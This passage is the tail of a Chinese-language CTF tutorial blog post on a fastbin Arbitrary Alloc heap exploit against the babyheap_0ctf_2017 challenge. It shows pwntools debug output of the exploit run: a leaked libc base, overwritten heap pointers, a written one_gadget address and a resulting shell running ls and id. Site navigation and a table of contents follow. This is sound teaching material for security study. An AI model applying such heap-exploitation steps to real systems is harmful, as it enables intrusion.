class="number">6</span>e <span class="number">74</span>  <span class="number">65</span> <span class="number">6</span>e <span class="number">74</span> <span class="number">3</span>a  <span class="number">20</span> <span class="number">0</span>a <span class="number">78</span> <span class="number">1b</span>  dd f7 ff <span class="number">7f</span>  │Cont│ent:│ ·x·│····│</span><br><span class="line">    <span class="number">00000010</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">78</span> <span class="number">1b</span>  dd f7 ff <span class="number">7f</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">0</span>a <span class="number">31</span>  <span class="number">2</span>e <span class="number">20</span> <span class="number">41</span> <span class="number">6</span>c  │··x·│····│···<span class="number">1</span>│. Al│</span><br><span class="line">    <span class="number">00000020</span>  <span class="number">6</span>c <span class="number">6f</span> <span class="number">63</span> <span class="number">61</span>  <span class="number">74</span> <span class="number">65</span> <span class="number">0</span>a <span class="number">32</span>  <span class="number">2</span>e <span class="number">20</span> <span class="number">46</span> <span class="number">69</span>  <span class="number">6</span>c <span class="number">6</span>c <span class="number">0</span>a <span class="number">33</span>  │loca│te·<span class="number">2</span>│. Fi│ll·<span class="number">3</span>│</span><br><span class="line">    <span class="number">00000030</span>  <span class="number">2</span>e <span class="number">20</span> <span class="number">46</span> <span class="number">72</span>  <span class="number">65</span> <span class="number">65</span> <span class="number">0</span>a <span class="number">34</span>  <span class="number">2</span>e <span class="number">20</span> <span class="number">44</span> <span class="number">75</span>  <span class="number">6</span>d <span class="number">70</span> <span class="number">0</span>a <span class="number">35</span>  │. Fr│ee·<span class="number">4</span>│. Du│mp·<span class="number">5</span>│</span><br><span class="line">    <span class="number">00000040</span>  <span class="number">2</span>e <span class="number">20</span> <span class="number">45</span> <span class="number">78</span>  <span class="number">69</span> <span class="number">74</span> <span class="number">0</span>a <span class="number">43</span>  <span class="number">6f</span> <span class="number">6</span>d <span class="number">6</span>d <span class="number">61</span>  <span class="number">6</span>e <span class="number">64</span> <span class="number">3</span>a <span class="number">20</span>  │. Ex│it·C│omma│nd: │</span><br><span class="line">    <span class="number">00000050</span></span><br><span class="line">[*] libc_base: <span class="number">0x7ffff7a0d000</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Size: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line">    <span class="string">&#x27;96\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x46</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Allocate Index 4\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1. Allocate\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Fill\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Free\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Dump\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Command: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;3\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x7</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Index: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;4\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x35</span> bytes:</span><br><span class="line">    <span class="string">&#x27;1. Allocate\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Fill\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Free\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Dump\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Command: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;2\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x7</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Index: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;2\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Size: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;8\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x9</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Content: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x8</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  ed <span class="number">1</span>a dd f7  ff <span class="number">7f</span> <span class="number">00</span> <span class="number">00</span>                            │····│····│</span><br><span class="line">    <span class="number">00000008</span></span><br><span class="line">[DEBUG] Received <span class="number">0x35</span> bytes:</span><br><span class="line">    <span class="string">&#x27;1. Allocate\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Fill\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Free\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Dump\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Command: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Size: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line">    <span class="string">&#x27;96\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x46</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Allocate Index 4\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1. Allocate\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Fill\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Free\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Dump\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Command: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Size: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line">    <span class="string">&#x27;96\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x46</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Allocate Index 6\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1. Allocate\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Fill\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x7</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Index: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;6\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Size: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line">    <span class="string">&#x27;27\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x9</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Content: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x1b</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │····│····│····│····│</span><br><span class="line">    <span class="number">00000010</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">7</span>a  <span class="number">22</span> a5 f7 ff  <span class="number">7f</span> <span class="number">00</span> <span class="number">00</span>                  │···z│<span class="string">&quot;···│···│</span></span><br><span class="line"><span class="string">    0000001b</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x35 bytes:</span></span><br><span class="line"><span class="string">    &#x27;1. Allocate\n&#x27;</span></span><br><span class="line"><span class="string">    &#x27;2. Fill\n&#x27;</span></span><br><span class="line"><span class="string">    &#x27;3. Free\n&#x27;</span></span><br><span class="line"><span class="string">    &#x27;4. Dump\n&#x27;</span></span><br><span class="line"><span class="string">    &#x27;5. Exit\n&#x27;</span></span><br><span class="line"><span class="string">    &#x27;Command: &#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    &#x27;1\n&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x6 bytes:</span></span><br><span class="line"><span class="string">    &#x27;Size: &#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x4 bytes:</span></span><br><span class="line"><span class="string">    &#x27;255\n&#x27;</span></span><br><span class="line"><span class="string">[*] Switching to interactive mode</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x3 bytes:</span></span><br><span class="line"><span class="string">    &#x27;ls\n&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Received 0xb1 bytes:</span></span><br><span class="line"><span class="string">    &#x27;babyheap_0ctf_2017\t  docker_hacknote    hadoop-3.3.0.tar.gz  yichen_exp.py\n&#x27;</span></span><br><span class="line"><span class="string">    &#x27;babyheap_0ctf_2017_patch  docker_one_gadget  main_arena_offset\n&#x27;</span></span><br><span class="line"><span class="string">    &#x27;docker_babyrop\t\t  edb\t\t     pwndbg-dev\n&#x27;</span></span><br><span class="line"><span class="string">babyheap_0ctf_2017      docker_hacknote    hadoop-3.3.0.tar.gz  yichen_exp.py</span></span><br><span class="line"><span class="string">babyheap_0ctf_2017_patch  docker_one_gadget  main_arena_offset</span></span><br><span class="line"><span class="string">docker_babyrop          edb             pwndbg-dev</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x3 bytes:</span></span><br><span class="line"><span class="string">    &#x27;id\n&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x81 bytes:</span></span><br><span class="line"><span class="string">    &#x27;uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)\n&#x27;</span></span><br><span class="line"><span class="string">uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Cyberangel</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://cyberangel.cn/2020/11/04/PWN%E5%85%A5%E9%97%A8%EF%BC%883-11-3%EF%BC%89-fastbin_attack%E4%B8%AD%E7%9A%84Arbitrary%20Alloc%EF%BC%88%E4%BE%8B%E9%A2%98%EF%BC%89/">https://cyberangel.cn/2020/11/04/PWN入门（3-11-3）-fastbin_attack中的Arbitrary Alloc（例题）/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://cyberangel.cn" target="_blank">Cyberangel-blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/11/10/PWN%E5%85%A5%E9%97%A8%EF%BC%883-12-1%EF%BC%89-House%20Of%20Force%EF%BC%88%E6%8E%A7%E5%88%B6top_chunk%EF%BC%89%EF%BC%88%E5%9F%BA%E7%A1%80%EF%BC%89/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PWN入门（3-12-1）-House Of Force（控制top_chunk）（基础）</div></div></a></div><div class="next-post pull-right"><a href="/2020/11/03/PWN%E5%85%A5%E9%97%A8%EF%BC%883-11-2%EF%BC%89-fastbin_attack%E4%B8%AD%E7%9A%84Arbitrary%20Alloc%EF%BC%88%E5%9F%BA%E7%A1%80%EF%BC%89/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PWN入门（3-11-2）-fastbin_attack中的Arbitrary Alloc（基础）</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">1.</span> <span class="toc-text">准备工作</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">静态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#main-%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">main 函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-addr-%E5%87%BD%E6%95%B0%EF%BC%88%E7%94%9F%E6%88%90%E9%9A%8F%E6%9C%BA%E5%9C%B0%E5%9D%80%EF%BC%89"><span class="toc-number">2.2.</span> <span class="toc-text">get_addr 函数（生成随机地址）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#menu-%E5%87%BD%E6%95%B0"><span class="toc-number">2.3.</span> <span class="toc-text">menu 函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Allocate-%E5%87%BD%E6%95%B0%EF%BC%88%E5%BC%80%E8%BE%9F%E5%A0%86%E7%A9%BA%E9%97%B4%EF%BC%89"><span class="toc-number">2.4.</span> <span class="toc-text">Allocate 函数（开辟堆空间）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fill-%E5%87%BD%E6%95%B0%EF%BC%88%E5%A1%AB%E5%85%85%E5%A0%86%E5%86%85%E5%AE%B9%EF%BC%89"><span class="toc-number">2.5.</span> <span class="toc-text">Fill 函数（填充堆内容）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Free-%E5%87%BD%E6%95%B0%EF%BC%88%E9%87%8A%E6%94%BE%E5%A0%86%E7%A9%BA%E9%97%B4%EF%BC%89"><span class="toc-number">2.6.</span> <span class="toc-text">Free 函数（释放堆空间）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dump-%E5%87%BD%E6%95%B0%EF%BC%88%E6%89%93%E5%8D%B0%E5%A0%86%E5%86%85%E5%AE%B9%EF%BC%89"><span class="toc-number">2.7.</span> <span class="toc-text">Dump 函数（打印堆内容）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#gdb-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-number">3.</span> <span class="toc-text">gdb 动态调试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%97%AD-ALSR-%E4%BF%9D%E6%8A%A4"><span class="toc-number">3.1.</span> <span class="toc-text">关闭 ALSR 保护</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp-%E8%AE%B2%E8%A7%A3"><span class="toc-number">4.</span> <span class="toc-text">exp 讲解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-%E5%86%85%E5%AE%B9"><span class="toc-number">4.1.</span> <span class="toc-text">exp 内容</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81leak-libc-addr"><span class="toc-number">4.3.</span> <span class="toc-text">1、leak libc addr</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1%E3%80%81%E6%A8%A1%E4%BB%BF%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%9F%E8%83%BD"><span class="toc-number">4.3.1.</span> <span class="toc-text">1-1、模仿程序的功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2%E3%80%81%E7%94%B3%E8%AF%B7-5-%E4%B8%AA-chunk"><span class="toc-number">4.3.2.</span> <span class="toc-text">1-2、申请 5 个 chunk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3%E3%80%81free-%E5%88%9B%E5%BB%BA%E7%9A%84-index1-%E5%92%8C-index2"><span class="toc-number">4.3.3.</span> <span class="toc-text">1-3、free 创建的 index1 和 index2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4%E3%80%81%E5%AF%B9-index0-%E8%BF%9B%E8%A1%8C-fill-%E6%93%8D%E4%BD%9C%EF%BC%8C%E6%BA%A2%E5%87%BA%E4%BF%AE%E6%94%B9-index2-%E7%9A%84-fd-%E6%8C%87%E9%92%88"><span class="toc-number">4.3.4.</span> <span class="toc-text">1-4、对 index0 进行 fill 操作，溢出修改 index2 的 fd 指针</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5%E3%80%81%E5%AF%B9-index3-%E8%BF%9B%E8%A1%8C-fill%EF%BC%8C%E5%B0%86-index4-%E7%9A%84%E5%A4%A7%E5%B0%8F%E4%BF%AE%E6%94%B9%E4%B8%BA-0x21"><span class="toc-number">4.3.5.</span> <span class="toc-text">1-5、对 index3 进行 fill，将 index4 的大小修改为 0x21</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-6%E3%80%81%E7%94%B3%E8%AF%B7-index4"><span class="toc-number">4.3.6.</span> <span class="toc-text">1-6、申请 index4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-7%E3%80%81%E4%BF%AE%E6%94%B9-index4-%E7%9A%84-size-%E4%B8%BA-0x91"><span class="toc-number">4.3.7.</span> <span class="toc-text">1-7、修改 index4 的 size 为 0x91</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-8%E3%80%81%E7%94%B3%E8%AF%B7%E6%96%B0%E5%A0%86%E5%9D%97%E2%80%93index5"><span class="toc-number">4.3.8.</span> <span class="toc-text">1-8、申请新堆块–index5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-9%E3%80%81free-index4-%EF%BC%8C%E5%B0%86-index4-%E6%94%BE%E5%85%A5-unsortedbin-%E4%B8%AD"><span class="toc-number">4.3.9.</span> <span class="toc-text">1-9、free(index4)，将 index4 放入 unsortedbin 中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-10%E3%80%81%E8%AE%A1%E7%AE%97-libc-%E5%9F%BA%E5%9D%80"><span class="toc-number">4.3.10.</span> <span class="toc-text">1-10、计算 libc 基址</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%8E%A7%E5%88%B6-malloc-hook"><span class="toc-number">4.4.</span> <span class="toc-text">2、控制__malloc_hook</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1%E3%80%81%E7%94%B3%E8%AF%B7-unsortedbin-%E4%B8%AD%E7%9A%84%E5%A0%86%E5%9D%97"><span class="toc-number">4.4.1.</span> <span class="toc-text">2-1、申请 unsortedbin 中的堆块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2%E3%80%81free-index4"><span class="toc-number">4.4.2.</span> <span class="toc-text">2-2、free(index4)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3%E3%80%81%E4%BF%AE%E6%94%B9-index4-%E7%9A%84-fd-%E6%8C%87%E9%92%88"><span class="toc-number">4.4.3.</span> <span class="toc-text">2-3、修改 index4 的 fd 指针</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4%E3%80%81%E6%8E%A7%E5%88%B6-malloc-hook"><span class="toc-number">4.4.4.</span> <span class="toc-text">2-4、控制__malloc_hook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5%E3%80%81%E5%86%99%E5%85%A5-one-gadget-%E5%B9%B6-getshell"><span class="toc-number">4.4.5.</span> <span class="toc-text">2-5、写入 one_gadget 并 getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-debug"><span class="toc-number">4.5.</span> <span class="toc-text">exp_debug</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2021 By Cyberangel</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">为世界上所有美好而战！！！</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://cyberangel.cn/2020/11/04/PWN%E5%85%A5%E9%97%A8%EF%BC%883-11-3%EF%BC%89-fastbin_attack%E4%B8%AD%E7%9A%84Arbitrary%20Alloc%EF%BC%88%E4%BE%8B%E9%A2%98%EF%BC%89/'
    this.page.identifier = '2020/11/04/PWN入门（3-11-3）-fastbin_attack中的Arbitrary Alloc（例题）/'
    this.page.title = 'PWN入门（3-11-3）-fastbin_attack中的Arbitrary Alloc（例题）'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Disqus' === 'Disqus' || !false) {
  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script><script>if (window.DISQUSWIDGETS === undefined) {
  var d = document, s = d.createElement('script');
  s.src = 'https://.disqus.com/count.js';
  s.id = 'dsq-count-scr';
  (d.head || d.body).appendChild(s);
} else {
  DISQUSWIDGETS.getCount({reset: true});
}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>